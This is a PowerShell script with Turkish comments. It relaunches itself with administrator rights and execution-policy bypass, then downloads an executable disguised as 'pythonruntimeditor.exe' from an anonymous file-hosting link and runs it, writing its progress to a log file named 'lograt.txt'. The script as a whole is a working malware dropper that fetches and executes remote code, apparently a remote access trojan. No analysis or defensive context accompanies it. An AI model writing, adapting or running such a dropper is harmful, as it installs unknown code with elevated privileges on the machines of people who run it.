# Yönetici yetkisi kontrolü ve yönetici olarak çalıştırma
$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

if (-not ($isAdmin.IsInRole($adminRole))) {
    # Eğer yönetici değilse, yönetici olarak scripti başlat
    Start-Process powershell -ArgumentList "Start-Process PowerShell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-Command $MyInvocation.MyCommand.Path'" -Verb RunAs
    exit
}

# Dosya indirme URL'si
$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"

# Log dosyasına yazılacak işlemler
$logFile = "C:\Users\dogud\Downloads\lograt.txt"

# Log fonksiyonunu tanımla
function Log-Message {
    param([string]$msg)
    Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg")
}

# Loglama işlemleri
Log-Message "Script başlatıldı."

# Dosya indir ve kontrol et
try {
    Log-Message "İndirme işlemi başlatılıyor..."
    
    # WebClient kullanarak dosya indir
    $client = New-Object System.Net.WebClient
    $client.DownloadFile($exeUrl, $localPath)

    # Dosya boyutunu kontrol et
    $fileSize = (Get-Item $localPath).length
    $expectedSize = 46000  # 46 KB'lik dosya için beklenen boyut

    if ($fileSize -lt $expectedSize) {
        Log-Message "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
        Remove-Item $localPath -Force
        $client.DownloadFile($exeUrl, $localPath)  # Tekrar indir
    } else {
        Log-Message "Dosya başarıyla indirildi. Boyut: $fileSize byte"
    }

    # Dosyayı çalıştır
    Log-Message "Dosya çalıştırılıyor..."
    Start-Process -FilePath $localPath -WindowStyle Normal
} catch {
    Log-Message "HATA: $($_.Exception.Message)"
}
